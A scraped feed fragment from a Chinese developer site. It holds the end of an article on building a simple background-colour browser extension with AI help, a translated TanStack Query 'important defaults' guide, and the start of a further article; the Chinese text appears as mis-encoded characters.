<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¿®æ”¹ content.js ä¸­å‡½æ•°ï¼Œå¢åŠ è¿˜åŸé€»è¾‘</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">changeBackgroundColor</span>(<span class="hljs-params">color</span>) {
  <span class="hljs-keyword">if</span> (color === <span class="hljs-string">'reset'</span>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">''</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'div, section, header, footer, article'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
      el.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">''</span>;
    });
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-comment">// åŸå§‹é€»è¾‘...</span>
}
</code></pre>
<blockquote>
<p>ğŸ”„ æœªæ¥å¯æ‰©å±•ä¸ºâ€œåˆ‡æ¢æ¨¡å¼â€ï¼Œå®ç°ä¸€é”®åˆ‡æ¢ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">ğŸ”š æ€»ç»“ï¼šå°åŠŸèƒ½ï¼Œå¤§å·¥ç¨‹</h2>
<p>Hulk æ‰©å±•è™½ä»…å®ç°â€œå˜ç»¿â€è¿™ä¸€å•ä¸€åŠŸèƒ½ï¼Œå´å®Œæ•´è¦†ç›–äº†æµè§ˆå™¨æ‰©å±•å¼€å‘çš„å…¨éƒ¨æ ¸å¿ƒç¯èŠ‚ï¼š</p>
<ul>
<li>âœ… Manifest é…ç½®</li>
<li>âœ… Popup UI/UX</li>
<li>âœ… æ¶ˆæ¯é€šä¿¡æœºåˆ¶ï¼ˆPopup â†” Content Scriptï¼‰</li>
<li>âœ… DOM æ·±åº¦æ“ä½œä¸å…¼å®¹æ€§å¤„ç†</li>
<li>âœ… è·¨æµè§ˆå™¨éƒ¨ç½²</li>
<li>âœ… æ–‡æ¡£é©±åŠ¨çš„åä½œæµç¨‹</li>
</ul>
<p>å®ƒä¸ä»…æ˜¯æŠ€æœ¯å®ç°çš„èŒƒä¾‹ï¼Œæ›´æ˜¯ <strong>Vibe Coding æ—¶ä»£å¼€å‘è€…è§’è‰²è½¬å‹</strong> çš„ç¼©å½±â€”â€”<strong>æˆ‘ä»¬ä¸å†åªæ˜¯ç¼–ç è€…ï¼Œæ›´æ˜¯ä¸Šä¸‹æ–‡æ¶æ„å¸ˆã€éœ€æ±‚ç¿»è¯‘å®˜ä¸ä½“éªŒå®ˆæŠ¤è€…</strong>ã€‚</p>
<p>æœªæ¥ï¼Œéšç€ Trae ç­‰ AI Agent èƒ½åŠ›å¢å¼ºï¼Œæ­¤ç±»å¾®å‹æ‰©å±•çš„å¼€å‘æˆæœ¬å°†è¿›ä¸€æ­¥é™ä½ï¼Œè€Œ<strong>é«˜è´¨é‡æ–‡æ¡£ä¸ç²¾å‡†éœ€æ±‚è¡¨è¾¾</strong>çš„ä»·å€¼å°†æ„ˆå‘å‡¸æ˜¾ã€‚ğŸš€</p>
<hr/>
<h2 data-id="heading-17">ğŸ§© Vibe Coding åä½œæ¨¡å¼ä¸‹çš„å¼€å‘å¯ç¤º</h2>
<p>æœ¬é¡¹ç›®å®Œç¾ä½“ç°äº† <strong>â€œæ–‡æ¡£é©±åŠ¨ + AI è¾…åŠ©â€</strong> çš„ç°ä»£å¼€å‘èŒƒå¼ï¼š</p>

























<table><thead><tr><th>äººç±»èŒè´£</th><th>AIï¼ˆå¦‚ Traeï¼‰èŒè´£</th></tr></thead><tbody><tr><td>æ’°å†™ <code>instruction.txt</code> æ˜ç¡®éœ€æ±‚</td><td>æ ¹æ®æŒ‡ä»¤ç”Ÿæˆ <code>manifest.json</code>ã€<code>popup.js</code> ç­‰æ¨¡æ¿ä»£ç </td></tr><tr><td>æä¾› <code>ux.png</code> è®¾è®¡ç¨¿</td><td>æ¨æµ‹ HTML/CSS ç»“æ„</td></tr><tr><td>å®šä¹‰æ¶ˆæ¯åè®®ï¼ˆ<code>action: "changeBackgroundColor"</code>ï¼‰</td><td>å®ç° <code>chrome.runtime.onMessage</code> ç›‘å¬é€»è¾‘</td></tr><tr><td>å¤„ç†è¾¹ç¼˜æƒ…å†µï¼ˆå¦‚ç™½è‰² div é®æŒ¡ï¼‰</td><td>ç”ŸæˆåŸºç¡€ DOM æ“ä½œå‡½æ•°</td></tr></tbody></table>
<blockquote>
<p>ğŸ“Œ <strong>å…³é”®ç»“è®º</strong>ï¼šAI ä¸æ“…é•¿â€œç†è§£æ„å›¾â€ï¼Œä½†æå…¶æ“…é•¿â€œæ‰§è¡Œè§„èŒƒâ€ã€‚å› æ­¤ï¼Œ<strong>æ¸…æ™°ã€ç»“æ„åŒ–ã€æ— æ­§ä¹‰çš„ä¸Šä¸‹æ–‡æ–‡æ¡£æ˜¯é«˜æ•ˆåä½œçš„å‰æ</strong>ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-18">ğŸ¯ æœ€ç»ˆæ€è€ƒï¼šAI + Vibe_Coding = ä¸‹ä¸€ä»£ç”Ÿäº§åŠ›</h2>
<p>Hulk æ‰©å±•çš„æˆåŠŸï¼Œä¸æ˜¯å› ä¸ºå®ƒçš„åŠŸèƒ½å¼ºå¤§ï¼Œè€Œæ˜¯å› ä¸ºå®ƒ<strong>å®Œç¾å¥‘åˆäº† AI æ—¶ä»£çš„åä½œèŠ‚å¥</strong>ï¼š</p>
<ul>
<li>ç”¨è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ï¼ˆ<code>instruction.txt</code>ï¼‰</li>
<li>ç”± AI å¿«é€Ÿç”ŸæˆåŸå‹ä»£ç </li>
<li>äººå·¥è°ƒè¯•ã€ä¼˜åŒ–ã€æµ‹è¯•</li>
<li>æœ€ç»ˆéƒ¨ç½²åˆ°çœŸå®ç¯å¢ƒï¼ˆEdge æµè§ˆå™¨ï¼‰</li>
</ul>
<p>è¿™ç§æ¨¡å¼æ­£åœ¨é‡å¡‘è½¯ä»¶å¼€å‘æµç¨‹ã€‚æœªæ¥ï¼Œ<strong>æ¯ä¸€ä¸ªå¼€å‘è€…éƒ½å°†æ˜¯â€œAI çš„äº§å“ç»ç†â€</strong>â€”â€”æˆ‘ä»¬è´Ÿè´£å®šä¹‰â€œè¦åšä»€ä¹ˆâ€ï¼Œè€Œä¸æ˜¯â€œæ€ä¹ˆåšâ€ã€‚</p>
<p>ğŸ‘‰ <strong>Hulk æ‰©å±•ï¼Œå°±æ˜¯è¿™åœºå˜é©çš„å¾®ç¼©æ¨¡å‹ã€‚</strong></p>
<hr/>
<p>âœ¨ <strong>é™„æ³¨</strong>ï¼šæ–‡ä¸­æ‰€æœ‰æˆªå›¾å‡æ¥è‡ªå®é™… Edge æµè§ˆå™¨ç¯å¢ƒæµ‹è¯•ï¼ŒéªŒè¯äº†æ‰©å±•åœ¨ä¸»æµæµè§ˆå™¨ä¸­çš„ç¨³å®šæ€§å’Œå¯ç”¨æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[important-defaultsï¼ˆé‡è¦çš„é»˜è®¤é…ç½®ï¼‰]]></title>    <link>https://juejin.cn/post/7582232291621240870</link>    <guid>https://juejin.cn/post/7582232291621240870</guid>    <pubDate>2025-12-11T08:54:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582232291621240870" data-draft-id="7582246395987066914" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="important-defaultsï¼ˆé‡è¦çš„é»˜è®¤é…ç½®ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2025-12-11T08:54:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çš®è›‹å°ç²¾çµ"/> <meta itemprop="url" content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            important-defaultsï¼ˆé‡è¦çš„é»˜è®¤é…ç½®ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çš®è›‹å°ç²¾çµ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:54:30.000Z" title="Thu Dec 11 2025 08:54:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¼€ç®±å³ç”¨ï¼ŒTanStack Query é…ç½®äº†ä¸€å¥—<strong>æ¿€è¿›ä½†åˆç†</strong>çš„é»˜è®¤å€¼ã€‚<strong>æœ‰æ—¶è¿™äº›é»˜è®¤å€¼ä¼šè®©æ–°ç”¨æˆ·æªæ‰‹ä¸åŠï¼Œæˆ–è€…å¦‚æœç”¨æˆ·ä¸çŸ¥é“å®ƒä»¬ï¼Œä¼šä½¿å­¦ä¹ /è°ƒè¯•å˜å¾—å›°éš¾ã€‚</strong> åœ¨ä½ ç»§ç»­å­¦ä¹ å’Œä½¿ç”¨ TanStack Query æ—¶ï¼Œè¯·è®°ä½ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li>é€šè¿‡ <code>useQuery</code> æˆ– <code>useInfiniteQuery</code> åˆ›å»ºçš„æŸ¥è¯¢å®ä¾‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šå°† <strong>ç¼“å­˜æ•°æ®è§†ä¸ºè¿‡æœŸï¼ˆstaleï¼‰</strong> ã€‚</li>
</ul>
<blockquote>
<p>è¦æ”¹å˜è¿™ç§è¡Œä¸ºï¼Œä½ å¯ä»¥ä½¿ç”¨ <code>staleTime</code> é€‰é¡¹å…¨å±€åœ°æˆ–ä¸ºæ¯ä¸ªæŸ¥è¯¢å•ç‹¬è¿›è¡Œé…ç½®ã€‚æŒ‡å®šæ›´é•¿çš„ <code>staleTime</code> æ„å‘³ç€æŸ¥è¯¢ä¸ä¼šé‚£ä¹ˆé¢‘ç¹åœ°é‡æ–°è·å–æ•°æ®ã€‚</p>
</blockquote>
<ul>
<li>
<p>è®¾ç½®äº† <code>staleTime</code> çš„æŸ¥è¯¢åœ¨ <code>staleTime</code> è€—å°½ä¹‹å‰éƒ½è¢«è®¤ä¸ºæ˜¯ <strong>æ–°é²œï¼ˆfreshï¼‰</strong> çš„ã€‚</p>
<ul>
<li>å°† <code>staleTime</code> è®¾ç½®ä¸ºä¾‹å¦‚ <code>2 * 60 * 1000</code>ï¼Œå¯ä»¥ç¡®ä¿æ•°æ®åœ¨ 2 åˆ†é’Ÿå†…ç›´æ¥ä»ç¼“å­˜è¯»å–ï¼Œè€Œä¸ä¼šè§¦å‘ä»»ä½•å½¢å¼çš„é‡æ–°è·å–ï¼Œæˆ–è€…ç›´åˆ°æŸ¥è¯¢è¢« <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3D.%2Fquery-invalidation.md" target="_blank" title="https://www.google.com/search?q=./query-invalidation.md" ref="nofollow noopener noreferrer">æ‰‹åŠ¨å¤±æ•ˆï¼ˆinvalidated manuallyï¼‰</a>ã€‚</li>
<li>å°† <code>staleTime</code> è®¾ç½®ä¸º <code>Infinity</code>ï¼Œåˆ™æ°¸è¿œä¸ä¼šè§¦å‘é‡æ–°è·å–ï¼Œç›´åˆ°æŸ¥è¯¢è¢« <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3D.%2Fquery-invalidation.md" target="_blank" title="https://www.google.com/search?q=./query-invalidation.md" ref="nofollow noopener noreferrer">æ‰‹åŠ¨å¤±æ•ˆ</a>ã€‚</li>
<li>å°† <code>staleTime</code> è®¾ç½®ä¸º <code>'static'</code>ï¼Œåˆ™ <strong>æ°¸ä¸</strong> è§¦å‘é‡æ–°è·å–ï¼Œå³ä½¿æŸ¥è¯¢è¢« <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3D.%2Fquery-invalidation.md" target="_blank" title="https://www.google.com/search?q=./query-invalidation.md" ref="nofollow noopener noreferrer">æ‰‹åŠ¨å¤±æ•ˆ</a> ä¹Ÿä¸ä¾‹å¤–ã€‚</li>
</ul>
</li>
<li>
<p><strong>è¿‡æœŸï¼ˆStaleï¼‰</strong> çš„æŸ¥è¯¢åœ¨ä»¥ä¸‹æƒ…å†µä¼šè‡ªåŠ¨åœ¨åå°é‡æ–°è·å–ï¼ˆRefetchï¼‰ï¼š</p>
<ul>
<li>æ–°çš„æŸ¥è¯¢å®ä¾‹æŒ‚è½½æ—¶</li>
<li>çª—å£é‡æ–°è·å¾—ç„¦ç‚¹æ—¶</li>
<li>ç½‘ç»œé‡æ–°è¿æ¥æ—¶</li>
</ul>
</li>
</ul>
<blockquote>
<p>è®¾ç½® <code>staleTime</code> æ˜¯é¿å…è¿‡åº¦é‡æ–°è·å–çš„æ¨èæ–¹æ³•ï¼Œä½†ä½ ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½® <code>refetchOnMount</code>ã€<code>refetchOnWindowFocus</code> å’Œ <code>refetchOnReconnect</code> ç­‰é€‰é¡¹æ¥è‡ªå®šä¹‰é‡æ–°è·å–çš„æ—¶é—´ç‚¹ã€‚</p>
</blockquote>
<ul>
<li>
<p>æŸ¥è¯¢å¯ä»¥é¢å¤–é…ç½® <code>refetchInterval</code> ä»¥å®šæœŸè§¦å‘é‡æ–°è·å–ï¼Œè¿™ä¸€è®¾ç½®ç‹¬ç«‹äº <code>staleTime</code>ã€‚</p>
</li>
<li>
<p>ä¸å†æœ‰æ´»è·ƒå®ä¾‹ï¼ˆå³æ²¡æœ‰ <code>useQuery</code>ã€<code>useInfiniteQuery</code> æˆ–æŸ¥è¯¢è§‚å¯Ÿè€…åœ¨ä½¿ç”¨å®ƒï¼‰çš„æŸ¥è¯¢ç»“æœä¼šè¢«æ ‡è®°ä¸ºâ€œéæ´»åŠ¨ï¼ˆinactiveï¼‰â€ï¼Œå¹¶ä¿ç•™åœ¨ç¼“å­˜ä¸­ä»¥å¤‡ç¨åå†æ¬¡ä½¿ç”¨ã€‚</p>
</li>
<li>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œâ€œéæ´»åŠ¨â€çš„æŸ¥è¯¢ä¼šåœ¨ <strong>5 åˆ†é’Ÿ</strong> åè¢«åƒåœ¾å›æ”¶ã€‚</p>
<blockquote>
<p>è¦æ›´æ”¹æ­¤è®¾ç½®ï¼Œä½ å¯ä»¥å°†æŸ¥è¯¢çš„é»˜è®¤ <code>gcTime</code> æ›´æ”¹ä¸ºé™¤ <code>1000 * 60 * 5</code> æ¯«ç§’ä»¥å¤–çš„å…¶ä»–å€¼ã€‚</p>
</blockquote>
</li>
<li>
<p>å¤±è´¥çš„æŸ¥è¯¢ä¼š <strong>é™é»˜é‡è¯• 3 æ¬¡ï¼Œå¹¶å¸¦æœ‰æŒ‡æ•°é€€é¿å»¶è¿Ÿ</strong>ï¼Œç„¶åæ‰ä¼šæ•è·å¹¶å‘ UI æ˜¾ç¤ºé”™è¯¯ã€‚</p>
<blockquote>
<p>è¦æ›´æ”¹æ­¤è®¾ç½®ï¼Œä½ å¯ä»¥å°†æŸ¥è¯¢çš„é»˜è®¤ <code>retry</code> å’Œ <code>retryDelay</code> é€‰é¡¹æ›´æ”¹ä¸ºé™¤ <code>3</code> å’Œé»˜è®¤æŒ‡æ•°é€€é¿å‡½æ•°ä»¥å¤–çš„å…¶ä»–å€¼ã€‚</p>
</blockquote>
</li>
<li>
<p>æŸ¥è¯¢ç»“æœé»˜è®¤è¿›è¡Œ <strong>ç»“æ„å…±äº«ï¼ˆstructurally sharedï¼‰ä»¥æ£€æµ‹æ•°æ®æ˜¯å¦å®é™…å‘ç”Ÿäº†å˜åŒ–</strong>ã€‚å¦‚æœæ²¡æœ‰å˜åŒ–ï¼Œ<strong>æ•°æ®å¼•ç”¨å°†ä¿æŒä¸å˜</strong>ï¼Œä»¥ä¾¿æ›´å¥½åœ°é…åˆ <code>useMemo</code> å’Œ <code>useCallback</code> å®ç°å€¼ç¨³å®šã€‚å¦‚æœè¿™ä¸ªæ¦‚å¿µå¬èµ·æ¥å¾ˆé™Œç”Ÿï¼Œåˆ«æ‹…å¿ƒï¼99.9% çš„æ—¶é—´ä½ ä¸éœ€è¦ç¦ç”¨å®ƒï¼Œå®ƒèƒ½ä»¥é›¶æˆæœ¬è®©ä½ çš„åº”ç”¨æ€§èƒ½æ›´é«˜ã€‚</p>
<blockquote>
<p>ç»“æ„å…±äº«ä»…é€‚ç”¨äºå…¼å®¹ JSON çš„å€¼ï¼Œä»»ä½•å…¶ä»–å€¼ç±»å‹å°†å§‹ç»ˆè¢«è§†ä¸ºå·²æ›´æ”¹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ å› ä¸ºå“åº”æ•°æ®è¿‡å¤§è€Œé‡åˆ°æ€§èƒ½é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ <code>config.structuralSharing</code> æ ‡å¿—ç¦ç”¨æ­¤åŠŸèƒ½ã€‚å¦‚æœä½ åœ¨æŸ¥è¯¢å“åº”ä¸­å¤„ç†é JSON å…¼å®¹çš„å€¼ï¼Œä¸”ä»æƒ³æ£€æµ‹æ•°æ®æ˜¯å¦æ›´æ”¹ï¼Œä½ å¯ä»¥æä¾›è‡ªå®šä¹‰å‡½æ•°ä½œä¸º <code>config.structuralSharing</code>ï¼Œé€šè¿‡æ—§å€¼å’Œæ–°å€¼è®¡ç®—ç»“æœï¼Œå¹¶æŒ‰éœ€ä¿ç•™å¼•ç”¨ã€‚</p>
</blockquote>
</li>
</ul>
<h2 data-id="heading-0">å»¶ä¼¸é˜…è¯»</h2>
<p>è¯·æŸ¥çœ‹ä»¥ä¸‹æ–‡ç« ï¼Œä»¥è·å–å…³äºé»˜è®¤é…ç½®çš„è¿›ä¸€æ­¥è§£é‡Šï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftkdodo.eu%2Fblog%2Fpractical-react-query" target="_blank" title="https://tkdodo.eu/blog/practical-react-query" ref="nofollow noopener noreferrer">Practical React Query</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftkdodo.eu%2Fblog%2Freact-query-as-a-state-manager" target="_blank" title="https://tkdodo.eu/blog/react-query-as-a-state-manager" ref="nofollow noopener noreferrer">React Query as a State Manager</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftkdodo.eu%2Fblog%2Fthinking-in-react-query" target="_blank" title="https://tkdodo.eu/blog/thinking-in-react-query" ref="nofollow noopener noreferrer">Thinking in React Query</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[queriesï¼ˆæŸ¥è¯¢ï¼‰]]></title>    <link>https://juejin.cn/post/7582399765448441883</link>    <guid>https://juejin.cn/post/7582399765448441883</guid>    <pubDate>2025-12-11T09:00:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582399765448441883" data-draft-id="7582232291621257254" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="queriesï¼ˆæŸ¥è¯¢ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2025-12-11T09:00:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çš®è›‹å°ç²¾çµ"/> <meta itemprop="url" content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            queriesï¼ˆæŸ¥è¯¢ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çš®è›‹å°ç²¾çµ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T09:00:56.000Z" title="Thu Dec 11 2025 09:00:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body 